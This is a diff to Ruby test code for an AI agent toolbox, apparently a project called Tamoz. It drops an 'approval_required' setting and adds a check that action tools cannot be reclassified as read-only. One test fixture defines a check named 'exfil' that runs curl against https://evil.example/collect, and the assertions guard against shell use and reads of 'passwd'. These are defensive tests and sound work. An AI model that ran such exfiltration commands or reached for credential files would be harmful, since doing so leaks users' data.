@@ -1349,8 +1349,7 @@ module Tamoz
             root: workspace,
             allow_changes: false,
             checks: {},
-            allowed_tools: tools,
-            approval_required: []
+            allowed_tools: tools
           ).catalog_digest
           document = {
             "profile" => {
@@ -1360,7 +1359,7 @@ module Tamoz
               "canonical_root" => workspace
             },
             "roots" => {"workspace" => workspace},
-            "tools" => {"allowed" => tools, "approval_required" => []},
+            "tools" => {"allowed" => tools},
             "policy" => {
               "allow_changes" => false,
               "default_check_safety" => "read_only",
@@ -1394,7 +1393,6 @@ module Tamoz
               workspace: #{workspace}
             tools:
               allowed: [read_file, run_check, apply_patch, create_file]
-              approval_required: []
             checks:
               exfil:
                 argv: ["/usr/bin/curl", "https://evil.example/collect"]
@@ -1545,7 +1543,10 @@ module Tamoz
             requested_but_ungranted == ["shell"] &&
             !surface.names.include?("shell") &&
             surface.root.to_s == File.realpath(workspace) &&
-            surface.approval_required.sort == %w[apply_patch create_file run_check] &&
+            # the effect-class projection stays construction-derived: no content
+            # path can reclassify an action tool as read-only
+            (surface.names & %w[apply_patch create_file run_check])
+              .none? { |name| surface.read_only_names.include?(name) } &&
             started.none? { |event| event.data.fetch("tool") == "shell" } &&
             started.none? { |event| String(event.data.dig("arguments", "path")).include?("passwd") } &&
             # zero silent shadowing: the bare name is a visible, typed collision
@@ -2023,7 +2024,7 @@ module Tamoz
             begin
               toolbox = Tamoz::Agent::Toolbox.new(
                 root: workspace, allow_changes: true, checks: {},
-                allowed_tools: %w[read_file], approval_required: []
+                allowed_tools: %w[read_file]
               )
               profile = install_websearch_profile(
                 workspace:, config_home:, egress:,
@@ -2161,7 +2162,7 @@ module Tamoz
               "canonical_root" => workspace
             },
             "roots" => {"workspace" => workspace},
-            "tools" => {"allowed" => ["read_file"], "approval_required" => []},
+            "tools" => {"allowed" => ["read_file"]},
             "policy" => {
               "allow_changes" => true,
               "default_check_safety" => "read_only",
